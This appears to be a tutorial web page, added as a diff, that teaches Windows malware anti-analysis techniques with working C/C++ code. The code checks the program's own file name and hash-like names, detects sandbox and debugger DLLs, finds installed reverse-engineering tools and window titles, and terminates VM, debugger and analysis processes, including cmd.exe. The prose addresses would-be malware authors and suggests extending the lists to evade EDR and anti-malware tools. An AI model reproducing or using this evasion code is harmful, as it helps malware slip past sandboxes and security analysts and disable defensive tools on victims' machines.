@@ -1,1 +1,625 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Analysis Detection - Angel Code</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/vs2015.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/cpp.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
+        body {
+            background-color: #000000;
+            color: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+        }
+
+        .header {
+            background-color: #000000;
+            padding: 30px 20px;
+            text-align: center;
+            border-bottom: 3px solid #1a1a1a;
+        }
+
+        .back-button {
+            display: inline-block;
+            background-color: #dc143c;
+            color: #ffffff;
+            padding: 10px 25px;
+            border-radius: 5px;
+            text-decoration: none;
+            margin-bottom: 20px;
+            transition: background-color 0.3s ease;
+        }
+
+        .back-button:hover {
+            background-color: #b01030;
+        }
+
+        .page-title {
+            font-size: 2.5em;
+            font-weight: 300;
+            letter-spacing: 3px;
+            margin-top: 10px;
+        }
+
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        h3 {
+            color: #dc143c;
+            font-size: 1.5em;
+            margin-top: 50px;
+            margin-bottom: 20px;
+            font-weight: 400;
+        }
+
+        .explanation {
+            background-color: #1a1a1a;
+            padding: 25px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 4px solid #dc143c;
+        }
+
+        .explanation p {
+            margin-bottom: 15px;
+            font-size: 1.05em;
+            line-height: 1.8;
+        }
+
+        .explanation p:last-child {
+            margin-bottom: 0;
+        }
+
+        .code-section {
+            margin-bottom: 40px;
+        }
+
+        .code-label {
+            color: #ffffff;
+            font-size: 1.1em;
+            font-weight: 600;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        pre {
+            background-color: #1a1a1a;
+            border: 1px solid #333333;
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin-bottom: 30px;
+        }
+
+        code {
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 0.95em;
+        }
+
+        .inline-code {
+            background-color: #1a1a1a;
+            color: #ce9178;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Consolas', 'Courier New', monospace;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <a href="../index.html" class="back-button">← Back to Home</a>
+        <div class="page-title">Analysis Detection</div>
+    </div>
+
+    <div class="container">
+        <h3>1. Checking File name</h3>
+
+        <div class="explanation">
+            <p>Malware files can check their own name when running to see if it's the same name their author has given them. If not, they will stop. This checks if the filename is "checkFileName.exe" or "checkFileName" - if it is, it will continue; if it is not, it will stop. When compiling, make sure to replace checkFileName with whatever name you used to name the file when compiling.</p>
+            <p>Note: "Checking File Hash" in my opinion is a better solution. "Checking file name" works, but when the code (file) is uploaded to a disassembler, the string of the filename is going to be there ("Checking File Hash" will not expose file origin info because it doesn't include file origin info in its code).</p>
+            <p>Note: To make it not so easy, you can of course obfuscate the string so it is not so easy to read.</p>
+            <p>Note: Even if the string is obfuscated, the string will still need to deobfuscate when it's being run to compare strings. You can do a memory dump when the string has already been deobfuscated to see what the string says.</p>
+            <p>Note: You can see other techniques to make sure the file will not run under VMs and Analysis Programs and therefore won't expose any information.</p>
+        </div>
+
+        <div class="code-section">
+            <span class="code-label">C/C++ Code</span>
+            <pre><code class="language-cpp">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+
+#define FILENAME "checkFileName.exe"
+#define FILENAME2 "checkFileName" 
+
+int checkFileName(){
+    char path[MAX_PATH];
+    
+    GetModuleFileName(NULL, path, MAX_PATH);
+    //get just the name by searching for the last /
+    //"" = string char array ''=single char (int)
+    const char *filename = strrchr(path, '\\');
+
+    if(filename){
+        filename++;
+    } else {
+        filename = path;
+    }
+    printf("Expected: %s\n", FILENAME);
+    printf("Extracted: %s\n", filename);
+
+    if(_stricmp(filename, FILENAME) == 0){
+        return 1;
+        
+    }else {
+        //just incase there isnt an .exe
+        if(_stricmp(filename, FILENAME2) == 0){
+            return 1;
+        }
+        else{
+            return 0;
+        }
+    }
+
+}
+
+int main(){
+    if(checkFileName() == 1){
+        printf("File name not changed\n");
+    }else{
+        printf("File name changed\n");
+    }
+}</code></pre>
+        </div>
+
+        <h3>2. Checking File Hash</h3>
+
+        <div class="explanation">
+            <p>In malware repos, they will save the file as its hash, so when malware is running it will check if the number of chars in its filename is 32 or 42+extension to see if its name is a hash. We see if the file name's length is over 32 characters - if it's over, it will flag it as a hash; if it's under, it will assume it's a normal file name.</p>
+            <p>Encryption Algorithms have fixed lengths when encrypting strings:</p>
+            <p>MD5 | Length: 32<br>
+            SHA-1 | Length: 40<br>
+            SHA-224 | Length: 56<br>
+            SHA-384 | Length: 96<br>
+            SHA-512 | Length: 128</p>
+        </div>
+
+        <div class="code-section">
+            <span class="code-label">C/C++ Code</span>
+            <pre><code class="language-cpp">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+
+int checkFileHash(){
+    char path[MAX_PATH];
+    
+
+    GetModuleFileName(NULL, path, MAX_PATH);
+    const char *filename = strrchr(path, '\\');
+
+    if(filename){
+        filename++;
+    }
+    else{
+        filename = path;
+    }
+    if(strlen(filename) &gt; 32){
+        return 1;
+    }
+    else{
+        return 0;
+    }
+}
+
+int main(){
+    if(checkFileHash() == 0){
+        printf("File name is under 32 characters, Probably a normal name\n");
+    }
+    else{
+        printf("File name is over 32 characters, May be a hash name\n");
+    }
+    return 0;
+}</code></pre>
+        </div>
+
+        <h3>3. Checking DLLs</h3>
+
+        <div class="explanation">
+            <p>Some sandboxes and malware analysis tools load modules (DLL inject) into the memory address space of a running malware process to modify the malware's behavior or to intercept its code. Malware can then look if those specific modules are loaded. You can add more DLLs into the DLL list to look for anti-malware, EDR, and other defensive tools.</p>
+        </div>
+
+        <div class="code-section">
+            <span class="code-label">C/C++ Code</span>
+            <pre><code class="language-cpp">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;tlhelp32.h&gt;
+
+
+char *DLLs[] = {
+        "SbieDll.dll",    
+        "VBoxHook.dll",   
+        "dbghelp.dll",    
+        "vmtools.dll",
+        "vmhgfs.dll",
+        "vboxmrxnp.dll",
+        "vboxogl.dll",
+        "ntsdexts.dll",
+    "dbgcore.dll",
+    "pstorec.dll",
+    "api_log.dll",
+    "hook.dll",
+    "ollydbg.dll",
+    "idauser.dll",
+    "windbg.dll",
+    "procexp.dll",
+    "procmon.dll",
+    "inject.dll",
+    "detours.dll",
+    "syserdbg.dll",
+    "x64dbg.dll",
+    "scylla.dll",
+    "cheatengine-i386.dll",
+    "cheatengine-x86_64.dll",
+    "qemu-ga.dll",
+    "bochs.dll"
+};
+
+int checkDLLs(){
+    //take a snapshot of all DLL,              DLL, what program we want to take a snapshot of
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());
+
+    //struc
+    MODULEENTRY32 me32;
+    //set mem size
+    me32.dwSize = sizeof(MODULEENTRY32);
+
+    if(Module32First(snapshot, &me32)){
+        do
+        {
+            for (int i = 0; i &lt; sizeof(DLLs)/sizeof(DLLs[0]); i++)
+            {
+                             //name of DLL
+                if (_stricmp(me32.szModule, DLLs[i]) == 0)
+                {//if they match 
+                    printf("%s\n",me32.szModule);
+                    CloseHandle(snapshot);
+                    exit(0);
+                }   
+            }
+        } while (Module32Next(snapshot, &me32));
+    }
+    else{
+        printf("\nError: %lu\n", GetLastError());
+        return 1;
+    }
+
+    CloseHandle(snapshot);
+    return 0;
+}
+
+int main(){
+    if(checkDLLs() == 0){
+        printf("No VM DLL's\n");
+    }
+    else{
+        printf("!!VM DLL's!!\n");
+    }
+    return 0;
+}</code></pre>
+        </div>
+
+        <h3>4. Checking Apps via MSI</h3>
+
+        <div class="explanation">
+            <p>Checking for VM or Analysis tools is an effective way to get information about the type of environment the malware is in. This script checks what type of apps are downloaded on the computer. NOTE: This only checks apps that were downloaded with an MSI - if the app wasn't, then it will not show up in MSI downloads. If there is a match with an app in the analysis tools list, it will let you know.</p>
+        </div>
+
+        <div class="code-section">
+            <span class="code-label">C/C++ Code</span>
+            <pre><code class="language-cpp">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;msi.h&gt;
+#include &lt;shlwapi.h&gt; //string comparison 
+
+char *apps[] = {
+    "IDA Pro",
+    "Ghidra",
+    "Radare2",
+    "Binary Ninja",
+    "OllyDbg",
+    "x64dbg",
+    "Immunity Debugger",
+    "Frida",
+    "Cutter",
+    "PEStudio",
+    "CFF Explorer",
+    "Scylla",
+    "Relocation Section Editor",
+    "API Monitor",
+    "Wireshark",
+    "Fiddler",
+    "Cheat Engine",
+    "Jadx",
+    "Hopper",
+    "dnSpy",
+    "ILSpy",
+    "Snowman",
+    "Capstone",
+    "RetDec",
+    "Hex-Rays Decompiler",
+    "Binwalk",
+    "Flare VM",
+    "Detect It Easy", 
+    "Procmon",
+    "Sysinternals Suite",
+    "python"
+};
+
+int listInstalledApps(){
+    TCHAR productCode[39]; //array to hold product code(ID) for each product installed
+                           //each product is 38+/0 = 39 
+    int counter = 0; //counter to go through all products
+    
+    //when there are no products it will stop looping
+    while(MsiEnumProducts(counter, productCode) == ERROR_SUCCESS){
+        TCHAR productName[256];
+        //api wants to know how much space they got
+        DWORD productNameSize = sizeof(productName)/sizeof(TCHAR);
+
+        if(MsiGetProductInfo(productCode, INSTALLPROPERTY_PRODUCTNAME, productName, &productNameSize) == ERROR_SUCCESS){
+            for(int i = 0; i &lt; sizeof(apps) / sizeof(apps[0]); i++){
+                if(StrStrI(productName, apps[i]) != NULL){
+                    //found analysis tool
+                    return 1;
+                }
+            }
+        }
+        counter++;
+    }
+    return 0;
+}
+
+int main(){
+    if(listInstalledApps() == 0){
+        printf("No code analysis tools found via MSI download\n");
+    } else{
+        printf("Code analysis tools found via MSI download\n");
+    }
+    return 0;
+}</code></pre>
+        </div>
+
+
+    <h3>5. Checking Windows Title</h3>
+
+        <div class="explanation">
+            <p>We can go through the host's open windows to determine whether it's trying to analyze code. We have a list of strings that, if they appear in the Windows title names, will raise a "[!]". It then will show how many window titles that fit in the list were found. You can change the list to search for any windows you may want to find, whether it be applications, certain websites, or files.</p>
+        </div>
+
+        <div class="code-section">
+            <span class="code-label">C/C++ Code</span>
+            <pre><code class="language-cpp">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;shlwapi.h&gt;
+
+char *searchTerms[] = {
+    "Code",
+    "analysis",
+    "VM",
+    "Virtual",
+    "VMBOX",
+    "wireshark",
+    "ollydbg",  
+    "procexp",  
+    "procmon", 
+    "ProcessHacker",  
+    "tcpview",  
+    "wireshark",  
+    "x64dbg",  
+    "inetsim",  
+    "ida64",  
+    "ida",  
+    "ghidra",  
+    "radare2",  
+    "cutter",  
+    "binaryninja",  
+    "immunitydebugger",  
+    "frida-server",  
+    "frida-trace",  
+    "cheatengine",  
+    "windbg",  
+    "dbgview",  
+    "dnspy",
+    "dotpeek",  
+    "de4dot",  
+    "jadx",  
+    "androgurad"
+
+};
+
+int counter = 0;
+
+//set up for EnumWindows function HANDLE
+BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam){
+    //buffer for window name
+    char windowTitle[256];
+    //return True to keep enumerating False to stop enumerating
+    if(IsWindowVisible(hwnd)){
+        /*
+        hWnd
+        A handle to the window to read the title of.
+        lpString
+        String variable that receives the window's text. This must already have enough room to receive the string.
+        nMaxCount
+        The length in characters of lpString.
+        returns 0 if error
+        */
+        int window = GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
+        int a = counter;
+        if(window){
+
+            
+            for(int i = 0; i &lt; sizeof(searchTerms) / sizeof(searchTerms[0]); i++){
+                if(StrStrI(windowTitle, searchTerms[i]) != NULL){
+                    printf("[!]Target Window Found: %s\n", windowTitle);
+                    counter++;
+                }
+            }
+            //to still print the window even if its to target
+            if(a == counter){
+                printf("Window: %s\n", windowTitle);
+            }
+
+            
+        }
+        
+    }
+    return TRUE;
+}
+
+int main(){
+    EnumWindows(EnumWindowsProc, 0);
+    if(counter){
+        printf("[!] %d Target Window(s) Found!\n", counter);
+    }
+    return 0;
+}</code></pre>
+        </div>     
+
+
+        <h3>6. Terminating Unwanted Process</h3>
+
+        <div class="explanation">
+            <p>If malware catches an unwanted process like a tool, it can just terminate the process.</p>
+        </div>
+
+        <div class="code-section">
+            <span class="code-label">C/C++ Code</span>
+            <pre><code class="language-cpp">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+//lists Processes, Threads, DDL
+#include &lt;tlhelp32.h&gt;
+#include &lt;string.h&gt;
+
+char *VMProcessNames[] = {
+"TPAutoConnSvc.exe",
+"VGAuthService.exe",
+"VMwareService.exe",
+"Vm3dservice.exe",
+"Vmtoolsd.exe",
+"Vmwaretray.exe",
+"Vmwareuser.exe",
+"cuckoo.exe",
+"VboxControl.exe",
+"VBoxService.exe",
+"VboxTray.exe",
+"autoruns.exe",
+"fiddler.exe",
+"ollydbg.exe",
+"procexp.exe",
+"procmon.exe",
+"ProcessHacker.exe",
+"tcpview.exe",
+"wireshark.exe",
+"x64dbg.exe",
+"inetsim",
+"ida64.exe",
+"ida.exe",
+"ghidra.exe",
+"radare2.exe",
+"cutter.exe",
+"binaryninja.exe",
+"immunitydebugger.exe",
+"frida-server.exe",
+"frida-trace.exe",
+"cheatengine.exe",
+"windbg.exe",
+"dbgview.exe",
+"dnspy.exe",
+"dotpeek.exe",
+"de4dot.exe",
+"jadx.exe",
+"androgurad.exe",
+"cmd.exe"
+};
+
+int VMProcessNamesSize = sizeof(VMProcessNames) / sizeof(VMProcessNames[0]);
+
+int searchProcesses(char *VMProcessNames[], int VMProcessNamesSize){
+    //takes snapshot of everything running. All processes, process ID. 0=all
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+   
+    if(hSnapshot == INVALID_HANDLE_VALUE){
+        printf("\nFailed to get snapshot of all processes.\n");
+        return 0;
+    }
+    /*perpare structure that stores info about 1 process
+    Name, ID, threads, Parent ID
+    */
+    PROCESSENTRY32 pe32;
+    //how big struct is
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    if(!Process32First(hSnapshot, &pe32)){
+        printf("\nFailed to get first process\n");
+        CloseHandle(hSnapshot);
+        return 0;
+    }
+
+    do {
+        for(int i = 0; i &lt; VMProcessNamesSize; i++) {
+            // Use _stricmp to compare case-insensitively
+            if (_stricmp(pe32.szExeFile, VMProcessNames[i]) == 0) {
+                printf("\nVM Process found\n");
+                printf("Process: %s | PID: %lu\n", pe32.szExeFile, pe32.th32ProcessID);
+                //make handle to exit process
+                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
+                //terminate process
+                if(!TerminateProcess(hProcess, 0)){
+                    printf("Error in terminating process: %s", pe32.szExeFile);
+                    CloseHandle(hProcess);
+                    CloseHandle(hSnapshot);
+                    return 0;
+                }
+                printf("Terminated Process %u\n", pe32.szExeFile);
+                CloseHandle(hProcess);
+                CloseHandle(hSnapshot);
+                return 1;
+            }
+        }
+    } while (Process32Next(hSnapshot, &pe32));
+
+    printf("\nNo VM processes found\n");
+    CloseHandle(hSnapshot);
+    return 0;   
+}
+
+void main(){
+    if (searchProcesses(VMProcessNames, VMProcessNamesSize) == 1){
+        printf("\nExiting program\n");
+        exit(0);
+    }
+}</code></pre>
+        </div>      
+
+
+        
+
+    </div>
+
+    <script>
+        hljs.highlightAll();
+    </script>
+</body>
+</html>
